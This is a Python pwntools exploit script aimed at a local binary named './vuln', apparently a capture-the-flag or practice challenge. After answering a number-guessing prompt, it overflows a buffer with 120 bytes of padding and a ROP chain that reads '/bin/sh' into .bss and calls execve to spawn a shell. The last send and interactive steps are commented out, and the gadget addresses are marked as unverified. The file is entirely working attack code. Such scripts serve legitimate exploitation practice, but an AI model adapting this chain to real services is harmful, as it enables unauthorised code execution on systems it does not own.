#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

BINARY = './vuln'

# Gadgets (verify these are correct)
POP_RDI = 0x00000000004119e2
POP_RSI = 0x0000000000400a55
POP_RDX = 0x000000000041153a
POP_RAX = 0x00000000004005af
SYSCALL = 0x000000000040138c
RET = 0x0000000000400416

def exploit():
    conn = process(BINARY)
    
    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(b"84")
    
    exe = ELF(BINARY, checksec=False)
    bss = exe.bss()
    
    # Single ROP chain
    payload = b"A" * 120
    payload += p64(RET)
    payload += p64(RET)
    payload += p64(RET)
    
    # read(0, bss, 8) to get "/bin/sh" 
    payload += p64(POP_RDI) + p64(0)        # stdin
    payload += p64(POP_RSI) + p64(bss)      # bss address
    payload += p64(POP_RDX) + p64(8)        # 8 bytes
    payload += p64(POP_RAX) + p64(0)        # sys_read
    payload += p64(RET)
    payload += p64(SYSCALL)
    
    # execve(bss, 0, 0)
    payload += p64(POP_RDI) + p64(bss)      # "/bin/sh" location
    payload += p64(POP_RSI) + p64(0)        # NULL
    payload += p64(POP_RDX) + p64(0)        # NULL  
    payload += p64(POP_RAX) + p64(59)       # sys_execve
    payload += p64(RET)
    payload += p64(SYSCALL)
    
    conn.recvuntil(b'Name? ')
    conn.sendline(payload)
    
    # Send "/bin/sh" for the read syscall
    conn.recv()
    #conn.send(b"/bin/sh\x00")
    
    #conn.interactive()


if __name__ == "__main__":
    exploit()